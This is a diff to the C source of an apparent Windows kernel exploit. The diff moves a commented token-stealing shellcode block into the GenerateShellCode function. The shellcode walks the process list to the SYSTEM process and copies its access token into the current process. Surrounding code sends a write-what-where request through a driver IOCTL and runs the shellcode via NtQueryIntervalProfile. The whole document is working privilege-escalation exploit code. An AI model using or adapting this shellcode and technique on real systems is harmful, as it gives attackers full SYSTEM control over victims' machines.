@@ -18,23 +18,6 @@
 
 unsigned long long payload[10] = {};
 
-/*
-const unsigned char payload[] = {
-    "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              // mov rax,[gs:0x188]  ; Current thread (KTHREAD)
-    "\x48\x8B\x80\xB8\x00\x00\x00"                      // mov rax,[rax+0xb8]  ; Current process (EPROCESS)
-    "\x48\x89\xC3"                                      // mov rbx,rax         ; Copy current process to rbx
-    "\x48\x8B\x9B\xF0\x02\x00\x00"                      // mov rbx,[rbx+0x2f0] ; ActiveProcessLinks
-    "\x48\x81\xEB\xF0\x02\x00\x00"                      // sub rbx,0x2f0       ; Go back to current process
-    "\x48\x8B\x8B\xE8\x02\x00\x00"                      // mov rcx,[rbx+0x2e8] ; UniqueProcessId (PID)
-    "\x48\x83\xF9\x04"                                  // cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
-    "\x75\xE5"                                          // jnz 0x13            ; Loop until SYSTEM PID is found
-    "\x48\x8B\x8B\x58\x03\x00\x00"                      // mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x358
-    "\x80\xE1\xF0"                                      // and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
-    "\x48\x89\x88\x58\x03\x00\x00"                      // mov [rax+0x358],rcx ; Copy SYSTEM token to current process
-    "\x48\x31\xC0"                                      // xor rax,rax         ; set NTSTATUS SUCCESS
-    "\xC3"                                              // ret                 ; Done!
-};
-*/
 struct write_what_where
 {
     void *what;
@@ -297,7 +280,25 @@ bool ExecuteShellcodeByNtQueryIntervalProfile()
 
 void *GenerateShellCode(HANDLE driverHandle)
 {
-    payload[0] = 0x00018825048B4865;
+/*
+const unsigned char payload[] = {
+    "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              // mov rax,[gs:0x188]  ; Current thread (KTHREAD)
+    "\x48\x8B\x80\xB8\x00\x00\x00"                      // mov rax,[rax+0xb8]  ; Current process (EPROCESS)
+    "\x48\x89\xC3"                                      // mov rbx,rax         ; Copy current process to rbx
+    "\x48\x8B\x9B\xF0\x02\x00\x00"                      // mov rbx,[rbx+0x2f0] ; ActiveProcessLinks
+    "\x48\x81\xEB\xF0\x02\x00\x00"                      // sub rbx,0x2f0       ; Go back to current process
+    "\x48\x8B\x8B\xE8\x02\x00\x00"                      // mov rcx,[rbx+0x2e8] ; UniqueProcessId (PID)
+    "\x48\x83\xF9\x04"                                  // cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
+    "\x75\xE5"                                          // jnz 0x13            ; Loop until SYSTEM PID is found
+    "\x48\x8B\x8B\x58\x03\x00\x00"                      // mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x358
+    "\x80\xE1\xF0"                                      // and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
+    "\x48\x89\x88\x58\x03\x00\x00"                      // mov [rax+0x358],rcx ; Copy SYSTEM token to current process
+    "\x48\x31\xC0"                                      // xor rax,rax         ; set NTSTATUS SUCCESS
+    "\xC3"                                              // ret                 ; Done!
+};
+*/
+
+    payload[0] = 0x0000018825048b4865;
 
     SendToDriver(driverHandle,0x0022200B,(void*) &payload[0], (void*) (((unsigned long long) KUSER_SHARED_DATA)+1) );
     return (void*) KUSER_SHARED_DATA;
